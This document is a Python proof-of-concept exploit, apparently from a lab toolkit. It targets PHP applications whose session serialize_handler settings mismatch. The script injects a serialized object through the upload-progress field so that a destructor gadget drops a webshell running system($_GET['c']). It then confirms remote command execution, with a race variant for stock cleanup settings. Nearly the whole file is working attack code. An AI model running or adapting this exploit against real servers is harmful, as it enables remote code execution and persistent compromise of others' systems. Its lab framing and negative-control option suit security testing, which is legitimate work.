#!/usr/bin/env python3
"""Session serialize_handler-mismatch Object Injection -> RCE.

The rfc1867 upload-progress hook writes the raw PHP_SESSION_UPLOAD_PROGRESS
field into a session key before any script runs. With write=php_serialize but
read=php (the mismatch), a ``|`` embedded in that key splits the record and
drops a trailing ``O:..`` object into a value position, so the legacy reader's
unserialize() instantiates it -> __destruct POP gadget -> RCE.

Application-level object injection (not a memory-corruption bug); works on
patched PHP. Gates: handler mismatch [non-default] + a reader-scope destructor
gadget [app-dependent] + upload_progress on + known save_path/controllable SID.
``base`` (cleanup=Off) is deterministic; ``race`` (stock cleanup=On) trickles
the upload to hold the window and needs a second free worker. -I safe.

Usage:
    # base variant (cleanup=Off target)
    python3 -I poc/routes/session_handler_mismatch.py http://127.0.0.1:8105 --cmd id
    # race variant (cleanup=On / stock target)
    python3 -I poc/routes/session_handler_mismatch.py http://127.0.0.1:8106 --race --cmd id
    # negative control: point --reader at a no-mismatch endpoint -> expect no RCE
    python3 -I poc/routes/session_handler_mismatch.py http://127.0.0.1:8105 --reader /safe.php
"""
from __future__ import annotations

import argparse
import os
import re
import socket
import sys
import threading
import time
from urllib.parse import quote

# _recv_all/_dechunk are re-exported here so modules importing this one as `shm`
# keep resolving them as shm.<name>.
_POC_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.http_raw import (  # noqa: E402
    recv_all as _recv_all, dechunk as _dechunk, parse_host)
from common.multipart import part as _mp_part  # noqa: E402

BOUNDARY = "P2Shandlermismatch"
DEFAULT_SHELL = b"<?php system($_GET['c']); ?>"


# HTTP (raw sockets: we need multipart control and Set-Cookie, and the lab
# images have no python3 so this always runs host-side against a published port)
def _split(buf: bytes, want_cookie: bool) -> tuple[str, bytes, str | None]:
    head, _, rest = buf.partition(b"\r\n\r\n")
    if b"chunked" in head.lower():
        rest = _dechunk(rest)
    status = head.split(b"\r\n")[0].decode("latin1", "replace") if head else ""
    sid = None
    if want_cookie:
        m = re.search(rb"Set-Cookie: PHPSESSID=([A-Za-z0-9,-]+)", head)
        if m:
            sid = m.group(1).decode()
    return status, rest, sid


def http_get(host: str, port: int, path: str, cookie: str | None = None,
             timeout: float = 15.0, want_cookie: bool = False):
    h = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
    if cookie:
        h += f"Cookie: PHPSESSID={cookie}\r\n"
    h += "Connection: close\r\n\r\n"
    with socket.create_connection((host, port), timeout=timeout) as s:
        s.sendall(h.encode())
        buf = _recv_all(s, timeout)
    return _split(buf, want_cookie)


def _mpart(name: bytes, value: bytes, filename: bytes | None = None) -> bytes:
    return _mp_part(name, value, filename=filename, boundary=BOUNDARY)


def http_post_multipart(host: str, port: int, path: str, body: bytes,
                        cookie: str | None = None, timeout: float = 20.0):
    h = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n")
    if cookie:
        h += f"Cookie: PHPSESSID={cookie}\r\n"
    h += (f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
          f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n")
    with socket.create_connection((host, port), timeout=timeout) as s:
        s.sendall(h.encode() + body)
        buf = _recv_all(s, timeout)
    return _split(buf, False)


# Payload
def build_object(gadget_class: str, shell_path: str, shell_body: bytes) -> bytes:
    """Default DeferredWriter{path,data} object. The `php` reader unserializes
    whatever lands after the first `|`; a valid O:.. stops at its own closing }."""
    gc = gadget_class.encode()
    p = shell_path.encode()
    return (b'O:%d:"%s":2:{s:4:"path";s:%d:"%s";s:4:"data";s:%d:"%s";}'
            % (len(gc), gc, len(p), p, len(shell_body), shell_body))


def poisoned_value(obj: bytes) -> bytes:
    # The upload-progress prefix (upload_progress_) is prepended by PHP; we only
    # control the field value. `inj|` places our object right after the first `|`.
    return b"inj|" + obj


# Variants
def get_sid(host: str, port: int, writer: str, sid: str | None, log) -> str | None:
    if sid:
        st, body, _ = http_get(host, port, writer)
        log(f"[*] recon: {st} | {body[:80].decode('latin1','replace').strip()}")
        return sid
    st, body, got = http_get(host, port, writer, want_cookie=True)
    log(f"[*] recon: {st} | {body[:80].decode('latin1','replace').strip()}")
    if got:
        log(f"[*] server-issued SID: {got}")
    return got


def check_rce(host: str, port: int, shell_name: str, cmd: str, log) -> str | None:
    st, body, _ = http_get(host, port, f"/{shell_name}?c={quote(cmd)}")
    out = body.decode("latin1", "replace")
    m = next((l for l in out.splitlines() if "uid=" in l), None)
    if m:
        log(f"[+] RCE: {m.strip()}")
        return m.strip()
    return None


def run_base(host, port, writer, reader, shell_name, shell_path, obj, cmd,
             sid, log) -> str | None:
    sid = get_sid(host, port, writer, sid, log)
    if not sid:
        log("[-] no SID (strict_mode and session did not start?)")
        return None
    body = (_mpart(b"PHP_SESSION_UPLOAD_PROGRESS", poisoned_value(obj))
            + _mpart(b"f", b"A" * (256 * 1024), filename=b"notes.txt")
            + b"--" + BOUNDARY.encode() + b"--\r\n")
    st, _, _ = http_post_multipart(host, port, writer, body, cookie=sid)
    log(f"[+] inject: {st} (poisoned key written to the session file)")
    st, body, _ = http_get(host, port, reader, cookie=sid)
    log(f"[+] trigger ({reader}): {st} | {body[:80].decode('latin1','replace').strip()}")
    return check_rce(host, port, shell_name, cmd, log)


def _slow_upload(host, port, writer, sid, prog, file_mb, chunk, delay):
    filedata = b"A" * (file_mb * 1024 * 1024)
    fhdr = (b"--" + BOUNDARY.encode() + b"\r\n"
            b'Content-Disposition: form-data; name="f"; filename="notes.txt"\r\n\r\n')
    tail = b"\r\n--" + BOUNDARY.encode() + b"--\r\n"
    pprog = _mpart(b"PHP_SESSION_UPLOAD_PROGRESS", prog)
    clen = len(pprog) + len(fhdr) + len(filedata) + len(tail)
    hdr = (f"POST {writer} HTTP/1.1\r\nHost: {host}\r\n"
           f"Cookie: PHPSESSID={sid}\r\n"
           f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
           f"Content-Length: {clen}\r\nConnection: close\r\n\r\n").encode()
    try:
        s = socket.create_connection((host, port), timeout=30)
        s.sendall(hdr + pprog + fhdr)
        sent = 0
        while sent < len(filedata):
            s.sendall(filedata[sent:sent + chunk])
            sent += chunk
            time.sleep(delay)
        s.sendall(tail)
        _recv_all(s, 10.0)
        s.close()
    except OSError:
        pass


def run_race(host, port, writer, reader, shell_name, shell_path, obj, cmd,
             sid, log, max_tries=40, file_mb=4) -> str | None:
    sid = get_sid(host, port, writer, sid, log)
    if not sid:
        log("[-] no SID (strict_mode and session did not start?)")
        return None
    prog = poisoned_value(obj)
    t = threading.Thread(target=_slow_upload,
                         args=(host, port, writer, sid, prog, file_mb, 128 * 1024, 0.5),
                         daemon=True)
    t.start()
    time.sleep(0.8)  # let the hook write the key; cleanup waits for END
    for i in range(1, max_tries + 1):
        http_get(host, port, reader, cookie=sid, timeout=5.0)
        hit = check_rce(host, port, shell_name, cmd, log)
        if hit:
            log(f"[+] race hit on try {i} (cleanup window beaten)")
            return hit
        time.sleep(0.12)
    log(f"[-] no race hit in {max_tries} tries (widen --file-mb / --max-tries)")
    return None


def main(argv: list[str]) -> int:
    ap = argparse.ArgumentParser(
        description="Session serialize_handler-mismatch Object Injection -> RCE "
                    "(app-level, conditional; works on patched 8.5.12).")
    ap.add_argument("url", help="base URL, e.g. http://127.0.0.1:8105")
    ap.add_argument("--writer", default="/index.php",
                    help="endpoint that writes the session (php_serialize side)")
    ap.add_argument("--reader", default="/legacy.php",
                    help="endpoint that reads the session (php-handler/mismatch side); "
                         "point at a no-mismatch endpoint to run the negative control")
    ap.add_argument("--race", action="store_true",
                    help="race variant for cleanup=On / stock targets")
    ap.add_argument("--sid", default=None)
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--shell-name", default="p2s_shm_shell.php")
    ap.add_argument("--gadget-class", default="DeferredWriter")
    ap.add_argument("--object", default=None,
                    help="raw serialized object to inject (overrides the default "
                         "DeferredWriter webshell-dropper)")
    ap.add_argument("--docroot", default="/var/www/html")
    ap.add_argument("--max-tries", type=int, default=40)
    ap.add_argument("--file-mb", type=int, default=4)
    args = ap.parse_args(argv)

    tgt = parse_host(args.url)
    if tgt.scheme != "http":
        raise SystemExit(f"only http:// targets supported, got {tgt.scheme!r}")
    host, port = tgt.host, tgt.port

    def log(m):
        print(m, flush=True)

    shell_path = f"{args.docroot}/{args.shell_name}"
    if args.object is not None:
        obj = args.object.encode()
    else:
        obj = build_object(args.gadget_class, shell_path, DEFAULT_SHELL)

    log(f"[*] target {host}:{port}  writer={args.writer} reader={args.reader} "
        f"{'race' if args.race else 'base'}")
    if args.race:
        hit = run_race(host, port, args.writer, args.reader, args.shell_name,
                       shell_path, obj, args.cmd, args.sid, log,
                       max_tries=args.max_tries, file_mb=args.file_mb)
    else:
        hit = run_base(host, port, args.writer, args.reader, args.shell_name,
                       shell_path, obj, args.cmd, args.sid, log)

    if hit:
        log(f"[+] webshell: http://{host}:{port}/{args.shell_name}?c=<cmd>")
        return 0
    log("[-] no RCE (check the gates: serialize_handler mismatch + gadget in "
        "the reader's scope; or this is the negative control)")
    return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
